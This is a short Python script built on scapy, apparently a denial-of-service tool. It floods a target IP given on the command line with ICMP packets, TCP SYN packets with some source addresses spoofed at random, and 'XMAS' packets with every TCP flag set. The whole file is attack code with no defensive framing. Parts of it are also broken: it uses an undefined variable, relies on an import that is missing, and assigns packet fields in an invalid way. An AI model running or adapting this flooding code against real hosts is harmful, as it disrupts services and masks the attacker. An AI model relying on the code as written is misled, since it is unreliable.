from scapy.all import *
from sys import argv
import socket

ip = argv[1]

def icmp():
  while 1:
    try:
      send(IP(dst=ip)/ICMP())
    except:
      pass

def rIp():
  i = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
  return i

def syn():
  port = argv[2]
  while 1:
    try:
      send(IP(dst=ip)/TCP(dport=port,
        flags="S",
        seq=RandShort(),
        ack=RandShort(),
        sport=RandShort()
      ))
    except:
      pass
    try:
      sport = random.randint(1000, 9000)
      seq = random.randint(1000, 9000)
      window = random.randint(1000, 9000)

      IP_Packet = IP()
      IP_Packet["src"] = rIp()
      IP_Packet["dst"] = ip
      TCP_Packet = TCP()
      TCP_Packet["sport"] = sport
      TCP_Packet["dport"] = port
      TCP_Packet["flags"] = "S"
      TCP_Packet["seq"] = seq
      TCP_Packet["window"] = Window

      while 1:
        try:
          send(IP_Packet/TCP_Packet, verbose=0)
        except:
          pass
    except:
      pass
      



def xmas():
  port = sys.argv[2]
  while 1:
    try:
      send(IP(dst=ip)/TCP(
        flags="FSRPAUEC",
        seq=RandShort(),
        ack=RandShort(),
        sport=RandShort()
      ))
    except:
      pass

